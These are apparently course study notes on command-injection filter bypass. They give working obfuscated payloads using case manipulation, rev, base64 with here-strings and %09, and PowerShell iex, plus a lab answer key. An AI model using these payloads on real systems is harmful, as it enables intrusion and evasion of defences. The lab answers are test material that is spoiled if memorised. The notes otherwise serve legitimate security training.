## ID
534

## Module
Command Injections

## Kind
notes

## Title
Section 9 — Advanced Command Obfuscation

## Description
Covers advanced WAF/filter bypass techniques including case manipulation, command reversal, and base64-encoded command execution for injecting complex payloads with multiple filtered characters.

## Tags
command-injection, obfuscation, base64, case-manipulation, reverse-commands, waf-bypass

## Commands
- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` — case manipulation with `tr` (Linux)
- `$(a="WhOaMi";printf %s "${a,,}")` — case manipulation with Bash parameter expansion
- `echo 'whoami' | rev` → `imaohw` — reverse a command string
- `$(rev<<<'imaohw')` — execute a reversed command (Linux)
- `echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64` — base64-encode a full command
- `bash<<<$(base64%09-d<<<<BASE64_STRING>)` — decode and execute base64 payload (space-bypassed)
- `echo -n whoami | iconv -f utf-8 -t utf-16le | base64` — encode for Windows PowerShell execution
- `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<B64>')))"` — PowerShell base64 execution

## What This Section Covers
When basic obfuscation (quotes, backslashes) isn't enough to bypass WAFs, advanced techniques encode or transform the entire command so it contains zero blacklisted characters. Base64 encoding is the most powerful approach — the entire payload (including pipes, slashes, spaces) gets encoded into an alphanumeric string that the filter can't parse, then decoded and executed at shell expansion time.

## Methodology
1. **Assess what's blocked:** If the command contains multiple filtered characters (pipes, slashes, spaces), individual bypasses become unwieldy — go straight to encoding.
2. **Base64 encode the full command** on your local machine:
   ```
   echo -n '<FULL_COMMAND>' | base64
   ```
3. **Build the execution wrapper** — decode in a subshell, pass to `bash` via here-string (`<<<` avoids pipe):
   ```
   bash<<<$(base64 -d<<<<BASE64_STRING>)
   ```
4. **Replace remaining filtered characters** — there's one space between `base64` and `-d`:
   ```
   bash<<<$(base64%09-d<<<<BASE64_STRING>)
   ```
5. **Prepend the injection operator:**
   ```
   ip=127.0.0.1%0abash<<<$(base64%09-d<<<<BASE64_STRING>)
   ```

### Alternative Techniques

**Case Manipulation (Linux):**
```
# tr approach — replace spaces with %09
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")

# Bash parameter expansion
$(a="WhOaMi";printf%09%s%09"${a,,}")
```

**Command Reversal (Linux):**
```
# Reverse on your machine
echo 'whoami' | rev    # → imaohw

# Execute reversed command on target
$(rev<<<'imaohw')
```

**Windows PowerShell:**
```
# Encode (from Linux)
echo -n whoami | iconv -f utf-8 -t utf-16le | base64

# Execute on target
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Output of `find /usr/share/ \| grep root \| grep mysql \| tail -n 1` | /usr/share/mysql/debian_create_root_user.sql | Base64-encoded the entire command, injected via `ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)` |

## Key Takeaways
- **Base64 is the nuclear option** — when a command has many filtered characters (pipes, slashes, spaces), encode the whole thing rather than bypassing each character individually.
- The `<<<` (here-string) operator replaces pipes for passing data between commands — critical when `|` is blacklisted.
- The only filtered character remaining in the base64 wrapper is one space (`base64 -d`) — replace with `%09`.
- Case manipulation and reversal are useful for simple single-word commands; base64 scales to arbitrarily complex commands.
- If `bash` or `base64` are themselves blacklisted, use quote insertion (`b'a's'h'`, `b'a'se64`) or alternatives (`sh` for execution, `openssl enc -base64 -d` for decoding, `xxd -r -p` for hex decoding).
- For Windows targets, remember to encode as UTF-16LE before base64 — PowerShell expects Unicode.

## Gotchas
- Don't forget to use `echo -n` (no trailing newline) when base64-encoding — a trailing newline changes the encoded output and may break the command.
- The `<<<` here-string is a Bash feature — won't work on `sh` or `dash`. If the target shell isn't Bash, you need an alternative like `echo <B64> | base64 -d | sh` (but then you need to bypass `|` another way).
- Base64 strings can contain `+`, `/`, and `=` — verify these aren't blacklisted. If they are, consider hex encoding with `xxd` instead.
